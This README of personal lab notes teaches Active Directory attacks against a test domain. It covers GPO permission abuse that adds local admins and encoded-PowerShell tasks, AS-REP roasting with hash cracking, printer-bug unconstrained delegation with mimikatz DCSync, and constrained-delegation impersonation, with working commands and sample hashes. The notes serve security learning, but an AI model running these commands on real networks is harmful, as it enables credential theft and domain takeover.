# EzpzActiveDirectory

This is my personal notes on learning Active Directory. Do check out this repo too! [AniqFakhrul - Archives](https://github.com/aniqfakhrul/archives)

**_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**

* **[Weak GPO Permission](#abusing-gpo-permissions)**
* **[Asrep-Roasting](#asrep-roasting)**
* **[Unconstrained-Delegation](#unconstrained-delegation)**
* **[Constrained-Delegation](#constrained-delegation)**

## Weak GPO Permissions

### Setup

- Go to Group Policy Management in Server Manager

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810174824.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810174848.png)

- Right Click at Group Policy Objects and Click on New. Then put name as VulnerableGPO.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175057.png)

- Go to Delegation Tab and add the user/group that we want.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175204.png)

- Click on the User and click on Advanced 

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175239.png)

- Click on Advanced again

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175319.png)

- Click on the User/Group and click on Edit.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175417.png)

- Clear all permissions

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175435.png)

- Tick only here (Write all properties, Read Permissions, All Validated Writes). Then click on Apply and OK.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175554.png)

- Right click on our domain name and click on Link an Existing GPO

- Choose our vulnerable GPO and click OK

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175738.png)

- It will show up here

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175812.png)

### Detect

- Enable Winrm on the user

```bash
# Open Settings
winrm configSDDL default
```

- Tick on Full Control on the user

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810180808.png)

- Go to Server Manager -> Active Directory Users and Computers -> Right Click on GPOUser -> Properties -> Member Of. Then add Remote Management Users.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810192748.png)

- Connect using winrs

```bash
# Commands
winrs -r:localhost -u:GPOUser -p:'Passw0rd@123!' powershell
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810180937.png)

- Import the Powerview module

```bash
# Downwload 
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# Commands
. .\PowerView.ps1
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181221.png)

- Get the SID for the user we want to check

```bash
# Commands
(Get-DomainUser "GPOUser").objectsid

# Output
S-1-5-21-1107409599-3969185633-1580028286-1105
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181533.png)

- Using powerview to find vulnerable GPO with the User SID

```bash
# Commands
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ?{$_.ActiveDirectoryRights.toString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-1107409599-3969185633-1580028286-1105"}}

# Output
AceType               : AccessAllowed
ObjectDN              : CN={2A7B783B-BD16-4EF2-9B53-59F0F0B76070},CN=Policies,CN=System,DC=bank,DC=local
ActiveDirectoryRights : GenericWrite
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1107409599-3969185633-1580028286-1105
AccessMask            : 131112
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181753.png)

- Take the CN value from the ObjectDN and use it in the commands below to find the name of the vulnerable GPO.

```bash
# Commands
Get-NetGPO "{2A7B783B-BD16-4EF2-9B53-59F0F0B76070}"

# Output
usncreated              : 16770
displayname             : VulnerableGPO
whenchanged             : 8/10/2021 9:56:31 AM
objectclass             : {top, container, groupPolicyContainer}
gpcfunctionalityversion : 2
showinadvancedviewonly  : True
usnchanged              : 16778
dscorepropagationdata   : {8/10/2021 9:56:31 AM, 8/10/2021 9:52:17 AM, 1/1/1601 12:00:00 AM}
name                    : {2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
flags                   : 0
cn                      : {2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
gpcfilesyspath          : \\bank.local\SysVol\bank.local\Policies\{2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
distinguishedname       : CN={2A7B783B-BD16-4EF2-9B53-59F0F0B76070},CN=Policies,CN=System,DC=bank,DC=local
whencreated             : 8/10/2021 9:51:01 AM
versionnumber           : 0
instancetype            : 4
objectguid              : 74a46cc3-42fb-43a1-af25-6105a389268c
objectcategory          : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=bank,DC=local
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181916.png)

- From the output above we found out that the name of GPO is **VulnerableGPO**

### Attack

**1. PowerGPOAbuse.ps1**

```bash
# Download
https://github.com/rootSySdk/PowerGPOAbuse

# Commands
. .\PowerGPOAbuse.ps1
Add-GPOGroupMember -Member 'GPOUser' -GPOIdentity 'VulnerableGPO' -Force
gpupdate /force

# Notes
- Make sure to run gpupdate /force everytime you make add changes.
```

**2. SharpGPOAbuse.exe**

```bash
# Download
https://github.com/FSecureLABS/SharpGPOAbuse
https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpGPOAbuse.exe

# Commands
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount GPOUser --GPOName "VulnerableGPO" --force
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author BANK\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -ExecutionPolicy Bypass -Enc JgAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGEAcwBrAHMAXAB0AG8AbwBsAHMAXABDAG8AbgB0AGUAbgB0AC4AcABzADEA" --GPOName "VulnerableGPO" --force
gpupdate /force
 
# Notes
- Make sure to run gpupdate /force everytime you make changes.
```

### References

```bash
1. https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
2. https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#abusing-weak-gpo-permissions
3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo
4. https://labs.f-secure.com/tools/sharpgpoabuse/
5. https://4sysops.com/archives/run-powershell-scripts-as-immediate-scheduled-tasks-with-group-policy/
6. https://github.com/aniqfakhrul/archives
```

## Asrep-Roasting

### Setup

- Create a user (AsrepRoastUser). Go to Server Manager -> Tools -> Active Directory Users and Computers. Right click on Users and click New -> User. Fill in all the details.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810214403.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810214539.png)

- Right click on the new User and click properties. Go to Account tab and tick on **Do not require Kerberos preauthentication**. 

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810215016.png)

- Also take notes to tick on **"Password Never Expires"** and untick on **"User must Change password at next logon"**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810222737.png)

### Attack On Windows

- Using **PowerView.ps1** we can enumerate users that have **Preauth** enabled.

```bash
# Download 
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

# Commands (Powerview)
Get-DomainUser -PreauthNotRequired -Properties distinguishedname

# Output
distinguishedname
-----------------
CN=AsrepRoast User,CN=Users,DC=bank,DC=local

# Commands (adsisearcher)
([adsisearcher]"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()

# Output
Path                                                Properties
----                                                ----------
LDAP://CN=AsrepRoast User,CN=Users,DC=bank,DC=local {givenname, codepage, objectcategory, dscorepropagationdata...}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810221142.png)

- Then use these tools to get the hash

```bash
# Download (Rubeus)
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# Commands (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /nowrap
 
# Output (Rubeus)

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: AS-REP roasting

[*] Target Domain          : bank.local

[*] Searching path 'LDAP://DC01.bank.local/DC=bank,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : AsrepRoastUser
[*] DistinguishedName      : CN=AsrepRoast User,CN=Users,DC=bank,DC=local
[*] Using domain controller: DC01.bank.local (fe80::69e4:c7b6:29d1:847f%5)
[*] Building AS-REQ (w/o preauth) for: 'bank.local\AsrepRoastUser'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$23$AsrepRoastUser@bank.local:224332F49C1EB8E5B0B98CF7A8DFA308$1EE690FF09E4E5AC4B0E013F52FA3006A468F809401B698E294CB937B38F1C1CAAC44BE5C825A31139D709E12F32C0B715467132D4519D0BF6633FECB8C227000AF57E76145473D8DA58A855771FFFCF986F4938CE8F255AA00CC85347CB0B67DDF0E32CB180D18639F6E59320C598B2A60118894C0ECB3A60913129A79B63EAF87B0EFA86C53D1ADDCC966EE3D2C71F11BAF8F0DEB07F0B094FB04AA84D8F9CCB247F6229BF10B88B20520A32454281D6E9C5402F2D89E1C0CE12110AACB8769E07DFC128D1BD21E86141ED306BAB2AD868ABA237E167A2A7E924A3DF5BC2CD0735BA85E88234FE

# Download (ASREPRoast)
https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1

# Commands (ASREPRoast)
Get-ASREPHash -Username AsrepRoastUser

# Output
$krb5asrep$AsrepRoastUser@bank.local:64aec4f448950fcc28b74073a2b21b80$333efa323aa6a76925a38d0ccc2a20e5f84de6fa96901a0ac83e9dced1c69fe07273f02f998c7b661770b61f6cae941fc58bc28a9df0c1443a7add3d61532963214ba5f34d9a03a89ba9612ada74451c071c4b0e82654a117ad466423937d941618050cc53ce25a07a47918684adc37c2b4d15c6aa4c1079e8cf23cd594e70fd0bde7cd249c298933794d2b09b80937179f214a2041d7fbea181da47c5eaa45ac6c92d49d0587d5486d4a3fc3203c65f0a038dbae6afa7b6a232a1984ab277580f183f037a4483fbe269cf7bd84b573be9effddb4bc575020094936c933b51f008ef451e6185e9f6
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223314.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223253.png)

- If we do not have Admin privileges , we might have difficulty to run PowerView to enumerate. This is because we cannot view the useraccount control attributes as low privilege user. The solution we can try bruteforce it using **adsisearcher** and **Get-ASREPHash**

```
# Commands
([adsisearcher]"(&(samAccountType=805306368))").FindAll().Properties.samaccountname | %{Get-ASREPHash -UserName $_ -ErrorAction SilentlyContinue}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810232137.png)


### Attack On Linux

- Use impacket tools (GetNPUsers.py)

```
# Download
https://github.com/SecureAuthCorp/impacket

# Commands
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/AsrepRoastUser' -no-pass
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223812.png)

### Cracking

- Crack with hashcat using this command

```bash
# Mode
18200

# Commands
.\hashcat.exe -m 18200 .\hash.txt .\pass.txt
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810224911.png)

### References

```bash
1. http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
2. https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
3. https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
4. https://github.com/aniqfakhrul/archives#asrep-roasting
```

## Unconstrained-Delegation

### Setup

1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Computer -> Right Click on the Domain join Computer -> Click on Properties.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811222825.png)

2. Go to Delegation tab and tick on **"Trust this computer for delegation to any service (Kerberos)"** and click Apply.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811222909.png)

### Detect

**1. PowerView.ps1**

```bash
# Commands (PowerView)
. .\PowerView.ps1
Get-DomainComputer -Unconstrained -Properties dnshostname

# Output (PowerView)
dnshostname
-----------
DC01.bank.local
VULN01.bank.local

# Commands (adsisearcher)
 ([adsisearcher]"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()
 
# Output (adsisearcher)
Path                                                  Properties
----                                                  ----------
LDAP://CN=DC01,OU=Domain Controllers,DC=bank,DC=local {ridsetreferences, logoncount, codepage, objectcategory...}
LDAP://CN=VULN01,CN=Computers,DC=bank,DC=local        {logoncount, codepage, objectcategory, iscriticalsystemobject...}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811224149.png)

2. Check if a spool service is running on a remote host

```bash
ls \\dc01\pipe\spoolss
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811225305.png)

### Attack

**1. Printer Bug**

- Download **Rebues.exe**

```bash
# Download Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

- Run this command in Rubeus **(with Elevated Privilege)**

```bash
# Command
.\Rubeus.exe monitor /interval:5 /nowrap
```

- While running Rubeus, we can run **SpoolSample.exe**

```bash
# Download & Compiled
https://github.com/leechristensen/SpoolSample.git

# Command
.\SpoolSample.exe DC01.bank.local VULN01.bank.local
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811231133.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811231146.png)

**2. Using secretdumps to perform dcsync**

- Open mimikatz then run 

```bash
sekurlsa::tickets /export
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811232703.png)

- We can see that there is DC **(kirbi file)**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811232724.png)

- Download **kekeo** and use this command. We will convert the kirbi file to a ccache file.

```bash
# Download
https://github.com/gentilkiwi/kekeo

# Command
misc::convert ccache dc01.kirbi
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811233303.png)

- Transfer the ccache file to attacker machine. Then use this commands to export the ccache file.

```bash
# Command
export KRB5CCNAME=dc01.ccaches
```

- Use secretsdump to perform dcsync.

```bash
secretsdump.py -k DC01.bank.local -just-dc
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235053.png)

- Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235232.png)

**3. Using mimikatz to perform dcsync**

- Open mimikatz and run this

```bash
# Commands
lsadump::dcsync /domain:bank.local /all /csv
lsadump::dcsync /domain:bank.local /user:DC01$
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235404.png)

### References

```bash
1. https://github.com/aniqfakhrul/archives#unconstrained-delegation
2. https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
3. http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
4. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation
5. https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/
```

## Constrained-Delegation

### Setup

1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Users -> Right Click -> New -> User. We going to create one user name **"serviceuser"**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153441.png)

2. Complete all the details.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153555.png)

3. Go to View -> Enable Advanced Features.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153746.png)

4. Double Click on the serviceuser and go to **Attribute Editor**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153825.png)

5. Find **"servicePrincipalName"** and add the service name.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154014.png)

6. Click apply and OK. We will see a new tab Delegation **(Close and double click on serviceuser again if not show)** . Tick on **"Trust this user for delegation to specified services only"** and **"Use any authentication protocol"**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154351.png)

7. Then click Add. Then click on Users or Computers. Add our DC Computer or any computer that we want this **"serviceuser"** to delegate. Then click OK.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154639.png)

8. Choose services such as **(HTTP, HOST, CIFS)** . Use CTRL to choose multiples.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154825.png)

9. Click on Apply once finish.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154846.png)

### Detect

**1. PowerView.ps1**

```bash
# Commands
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | select -Exp msds-allowedtodelegateto

# Output

logoncount               : 0
badpasswordtime          : 1/1/1601 8:00:00 AM
distinguishedname        : CN=Service User,CN=Users,DC=bank,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : Service User
userprincipalname        : serviceuser@bank.local
name                     : Service User
objectsid                : S-1-5-21-1107409599-3969185633-1580028286-1111
samaccountname           : serviceuser
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 8/12/2021 7:48:58 AM
instancetype             : 4
usncreated               : 32793
objectguid               : f591b816-c313-43ad-83ea-53030138e363
sn                       : User
lastlogoff               : 1/1/1601 8:00:00 AM
msds-allowedtodelegateto : {http/DC01.bank.local/bank.local, http/DC01.bank.local, http/DC01,
                           http/DC01.bank.local/BANK...}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=bank,DC=local
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : BANK/mssql
givenname                : Service
lastlogon                : 1/1/1601 8:00:00 AM
badpwdcount              : 0
cn                       : Service User
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 8/12/2021 7:36:09 AM
primarygroupid           : 513
pwdlastset               : 8/12/2021 3:36:09 PM
usnchanged               : 32816

# Commands (adsisearcher)
([adsisearcher]"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))").FindAll().Properties

# Output
Name                           Value
----                           -----
givenname                      {Service}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=bank,DC=local}
dscorepropagationdata          {1/1/1601 12:00:00 AM}
usnchanged                     {32816}
instancetype                   {4}
logoncount                     {0}
name                           {Service User}
badpasswordtime                {0}
pwdlastset                     {132732273695770019}
serviceprincipalname           {BANK/mssql}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
usncreated                     {32793}
sn                             {User}
objectguid                     {22 184 145 245 19 195 173 67 131 234 83 3 1 56 227 99}
whencreated                    {8/12/2021 7:36:09 AM}
adspath                        {LDAP://CN=Service User,CN=Users,DC=bank,DC=local}
useraccountcontrol             {16843264}
cn                             {Service User}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {8/12/2021 7:48:58 AM}
msds-allowedtodelegateto       {http/DC01.bank.local/bank.local, http/DC01.bank.local, http/DC01, http/DC01.bank.loc...
lastlogon                      {0}
distinguishedname              {CN=Service User,CN=Users,DC=bank,DC=local}
samaccountname                 {serviceuser}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 186 1 66 97 247 148 236 126 81 45 94 87 4 0 0}
lastlogoff                     {0}
displayname                    {Service User}
accountexpires                 {9223372036854775807}
userprincipalname              {serviceuser@bank.local}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812155831.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812155856.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812160050.png)

### Attack

**1. Knowing Plaintext/NTLM**

*Story : We get a low privillege user with knowing the Plaintext/NTLM of the serviceuser.*

- Generate from Plaintext to NTLM using **Rubeus.exe**

```bash
# Command
.\Rubeus.exe hash /user:serviceuser /domain:BANK /password:'Passw0rd@123!'

# Output
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Passw0rd@123!
[*] Input username             : serviceuser
[*] Input domain               : BANK
[*] Salt                       : BANKserviceuser
[*]       rc4_hmac             : 577BA934CE4EC1598BF4851AA85E465F
[*]       aes128_cts_hmac_sha1 : D3C206F0505524956B96943C9E8CDC84
[*]       aes256_cts_hmac_sha1 : 2E9C58D91EA51602E626D315ED3986A041D316F30449E5E6E6F6E65C38379D20
[*]       des_cbc_md5          : A8B93E8694C77FAE
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812160640.png)

- Use **Rubeus.exe** to perform s4u delegation and request TGT for user that we want to impersonate. 

```bash
# Commands
.\Rubeus.exe s4u /user:serviceuser /rc4:577BA934CE4EC1598BF4851AA85E465F /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
```

- Use **klist** to view current session ticket. **(Use klist purge to remove all)**

```bash
# Commands
klist
klist purge
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162220.png)

- We can try list **DC01** with this command now.

```bash
# Command
ls \\dc01\c$
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162307.png)

- We can try **winrs** but take notes that it only work once. So everytime we want to run winrs, we need to re run the Rubeus again and request TGT.

```bash
# Command
winrs -r:DC01 whoami
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162541.png)

- We can also try to mount C$ of DC01 to another drive in our machine.

```bash
# Command
net use Z: \\dc01\c$
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162821.png)

- We can also try to use **getST** to get the impersonate user ccache file. Then use it to perform dcsync.

```bash
# Command
getST.py -spn cifs/DC01.BANK.LOCAL 'BANK.LOCAL/serviceuser:Passw0rd@123!' -impersonate Administrator -dc-ip 192.168.125.136
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k DC01.bank.local -just-dc
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812164956.png)

- Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235232.png)


**2. Has session without knowing Plaintext/NTLM**

*Story : We get shell on serviceuser without knowing the Plaintext/NTLM of the user.*

- Download Rubeus.exe and use this command to request TGT of the current user.

```bash
# Command
.\Rubeus.exe tgtdeleg /nowrap

# Output
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.bank.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 4ks0IWvIk0MLZrnSKLEmA+36Bzd8Vxpqb8mQCzhYFV4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFHDCCBRigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoQwbCkJBTksuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkJBTksuTE9DQUyjggPgMIID3KADAgESoQMCAQKiggPOBIIDynxkLrleGuNwtXwlF/PYhe8WOFcxkt/Oe26p5pRThHknzUxzLjKCCAz/g4eeRlE0tKjImlEPNDuIOocI03DkdU0jOVoAS5okb2uBqEIIKJzPBQiFJEaRr1kqxbTT0+O3/8dHmaZZk6mQwTTs7YRg7axdq450MPMxXuZJ3ERrHNtcVHe+Xx076bCazi3yvRQgzXVn6YkkUDQgn4k2MbVJyXk3FmXDeyoPpE3XtYN/pjrZgw4yL3HS181joPfK89I9fa3n3R46eXvN9FXEs+5IawnkL66YVfYkjGm/kLxQO2OQE3dUKjVMXhEdkHZVqHuRLzNYdOWd3TfQc5DejGhz20R0Rrp7m088pE64rNnq80OR+wHBjHHK0N/QOAFPmxv8U1ZkarwresTXFDeOi3VAB35It881QkrV8ziLsj6EdPrgF/+qKOhXWbqzc2Khm+bkiq8ATJ+W9UydGvFWCN8Uy6gihEcGzYlb+GfO0C8ZpGBypIQkgFIDVQvsebmU6pPrgnHqnPJN7kiJkCDqnbeg6aMTarLnDX2mz8/mX4wLt3TTxPmb0mE7f5DAy0Lszhg8rdYnX70wt9nn4prPBv4mwXtC8sSkrJCvwSDOQVOKl+rVFeM+Tr+qb8UWd8yEr64ub2W46lGXHJsrD9LqIIRrhgZTw0cO6QijLz+VBurbqjDwkbkxpD8eFDNzpLpat+LW+dOy82ggyQT5sk1TmMMYwA9MNMVMjKVjvifx6jqWWZ4a0jwLl2FLKEXry+iflSqo3xSMfIdAfjZrJ5lxT4B0pRH3D/mnmGQp5fDPGkUipbet/A8d3wjtsVc/6KYWo7cep8072h6fuLMY6mq7ioB4qmKsjEuge44jMSGAYOFRQ6s+9nBACmHQm3WI59kcKVzRHeU8CkbbvO1G9kMzNUcb4b5hxThdaaQuwshj9erjOCMEr0iuM2clojdA/zobxdOribE6e+Jc1V3lGgBv8uWPYwGgiXo1MfaTscNfseWkGHKnoL+iOR/OWfF26gEGVeYCM210xXUqD7qJdaptri+dy9saUUTc3K3otdfxgX7y1EjbPRrJGZg+IJFcW6GeNxaY3jwItH+doH+ofV/KY0SIaXRYYv5bJjhfWD7jfOFauQ6LAWurKROalmG4k/tuy71tTvPoCxirJSROQLmmFpDQHdKUWMrRSh751K1T6qn0BqBmeOiRe7nfQO3dA6/KADUJq1qYjGV4RtuG3DbBybyVgWHueqFgsO8TJxPB1h5fKzR32G7gsR3hasb/6dozSPyUwUy5PkmiCwpuokWjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAcu/sYSNMjndnV4/66z3/2UCMoEUIXGdyd+z7YfEcbUqEMGwpCQU5LLkxPQ0FMohgwFqADAgEBoQ8wDRsLc2VydmljZXVzZXKjBwMFAGChAAClERgPMjAyMTA4MTIwODMxMzBaphEYDzIwMjEwODEyMTgzMTMwWqcRGA8yMDIxMDgxOTA4MzEzMFqoDBsKQkFOSy5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQkFOSy5MT0NBTA==
```

- Then use **Rubues.exe** again to perform s4u delegation and request TGT for user that we want to impersonate. 

```bash
# Command
.\Rubeus.exe s4u /user:serviceuser /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812163800.png)

- Then we can try the same thing like the first scenario. For example we can try list **DC01** with this command now.

```bash
# Command
ls \\DC01\c$
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812163943.png)

### References

```bash
1. https://github.com/aniqfakhrul/archives#constrained-delegation
2. https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation
```